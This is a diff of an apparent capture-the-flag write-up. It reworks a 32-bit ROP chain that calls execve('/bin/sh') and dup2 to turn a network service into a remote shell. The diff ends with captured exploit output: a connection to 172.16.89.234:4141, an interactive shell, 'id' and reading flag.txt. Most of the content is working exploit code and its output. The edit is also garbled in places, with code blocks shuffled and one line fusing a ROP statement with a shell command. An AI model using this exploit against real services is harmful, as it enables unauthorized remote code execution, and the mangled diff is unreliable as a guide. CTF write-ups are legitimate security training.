@@ -170,13 +170,6 @@ We build the `execve /bin/sh` using `ropper`. While it seems promising, at the e
 * ropchain has swapped `neg eax; ret` with the previous `pop eax; ret` value on stack. Again, easy tweak, we need to swap the value with the `neg eax; ret` gadget.
 
 ```
-buf += SAVED_EBX
-buf += SAVED_ESI
-buf += SAVED_EBP
-
-DUP2 = 0x3f
-EXECVE = 0xb
-
 from struct import pack
 
 pa = lambda x : pack('I', x)
@@ -189,6 +182,56 @@ def rebase_0(x):
   return s
 
 rop = ''
+
+rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
+rop += '//bi'
+rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
+rop += rebase_0(0x00098110)
+rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
+rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
+rop += 'n/sh'
+rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
+rop += rebase_0(0x00098114)
+rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
+rop += rebase_0(0x0000e730) # 0x08056730: xor eax, eax; ret;
+rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
+rop += rebase_0(0x00098118)
+rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
+rop += rebase_0(0x0002bfc2) # 0x08073fc2: pop ecx; pop ebx; ret;
+rop += rebase_0(0x00098118)
+rop += pa(0xdeadbeef)
+rop += rebase_0(0x000001d9) # 0x080481d9: pop ebx; ret;
+rop += rebase_0(0x00098110)
+rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
+rop += rebase_0(0x00098118)
+rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
+rop += pa(0xfffffff5)
+rop += rebase_0(0x00019b37) # 0x08061b37: neg eax; ret;
+rop += rebase_0(0x0002ca80) # 0x08074a80: int 0x80; ret;
+
+
+print('%r' % rop)
+assert('\x00' not in rop)
+
+buf += rop
+assert('\x00' not in buf)
+
+p.send(buf)
+
+time.sleep(1.0)
+
+p.interactive()
+
+p.close()
+```
+
+**OK**, the binary has turned into a shell. Now we have to make it remote now !
+
+## Proof: We have a remote shell
+
+We just need to make three `dup2` calls to reopen 0, 1, and 2 as duplicates of file descriptor 4, as we know 4 will always be the file descriptor number used to talk with the client.
+
+```
 
 # safe, no cloberring
 def set_eax(eax):
@@ -244,53 +287,18 @@ rop += set_eax(0x3f)
 rop += set_ecx(2)
 rop += set_ebx(4)
 rop += p32(0x08074a80) # 0x08074a80: int 0x80; ret;
-
-
-rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
-rop += '//bi'
-rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
-rop += rebase_0(0x00098110)
-rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
-rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
-rop += 'n/sh'
-rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
-rop += rebase_0(0x00098114)
-rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
-rop += rebase_0(0x0000e730) # 0x08056730: xor eax, eax; ret;
-rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
-rop += rebase_0(0x00098118)
-rop += rebase_0(0x0000f175) # 0x08057175: mov dword ptr [edx], eax; ret;
-rop += rebase_0(0x0002bfc2) # 0x08073fc2: pop ecx; pop ebx; ret;
-rop += rebase_0(0x00098118)
-rop += pa(0xdeadbeef)
-rop += rebase_0(0x000001d9) # 0x080481d9: pop ebx; ret;
-rop += rebase_0(0x00098110)
-rop += rebase_0(0x0002bf9b) # 0x08073f9b: pop edx; ret;
-rop += rebase_0(0x00098118)
-rop += rebase_0(0x00065f86) # 0x080adf86: pop eax; ret;
-rop += pa(0xfffffff5)
-rop += rebase_0(0x00019b37) # 0x08061b37: neg eax; ret;
-rop += rebase_0(0x0002ca80) # 0x08074a80: int 0x80; ret;
-
-
-print('%r' % rop)
-assert('\x00' not in rop)
-
-buf += rop
-assert('\x00' not in buf)
-
-p.send(buf)
-
-time.sleep(1.0)
-
-p.interactive()
-
-p.close()
 ```
 
-**OK**, the binary has turned into a shell. Now we have to make it remote now !
+```
 
-## Proof: We have a remote shell
 
-Make three `dup2` calls to reopen 0, 1, and 2 as 4, as we know 4 will always be the file descriptor number used to talk with the client.
-
+rop += set_ecx(0)./exploit.py
+[+] Opening connection to 172.16.89.234 on port 4141: Done
+> 'Who are you ?\n'
+'\x86\xdf\n\x08\xc0\xfe\xff\x81g\x88\x05\x08\xc2?\x07\x08\xff\xff\xff\xffAAAA\x97\xa4\x0c\x08\xd9\x81\x04\x08\xff\xfe\xfe\xfe:\xe4\x05\x08\x05\x01\x01\x010d\t\x08\x80J\x07\x08\x86\xdf\n\x08\xc0\xfe\xff\x81g\x88\x05\x08\xc2?\x07\x08\xff\xff\xff\xffAAAA\x97\xa4\x0c\x08\x97\xa4\x0c\x08\xd9\x81\x04\x08\xff\xfe\xfe\xfe:\xe4\x05\x08\x05\x01\x01\x010d\t\x08\x80J\x07\x08\x86\xdf\n\x08\xc0\xfe\xff\x81g\x88\x05\x08\xc2?\x07\x08\xff\xff\xff\xffAAAA\x97\xa4\x0c\x08\x97\xa4\x0c\x08\x97\xa4\x0c\x08\xd9\x81\x04\x08\xff\xfe\xfe\xfe:\xe4\x05\x08\x05\x01\x01\x010d\t\x08\x80J\x07\x08\x86\xdf\n\x08//bi\x9b?\x07\x08\x10\x01\x0e\x08uq\x05\x08\x86\xdf\n\x08n/sh\x9b?\x07\x08\x14\x01\x0e\x08uq\x05\x080g\x05\x08\x9b?\x07\x08\x18\x01\x0e\x08uq\x05\x08\xc2?\x07\x08\x18\x01\x0e\x08\xef\xbe\xad\xde\xd9\x81\x04\x08\x10\x01\x0e\x08\x9b?\x07\x08\x18\x01\x0e\x08\x86\xdf\n\x08\xf5\xff\xff\xff7\x1b\x06\x08\x80J\x07\x08'
+[*] Switching to interactive mode
+$ id
+uid=1000(osadmin) gid=1000(osadmin) groups=1000(osadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),999(docker)
+$ cat flag.txt
+UYB{7e0d516adc1caf09b72646921}
+```
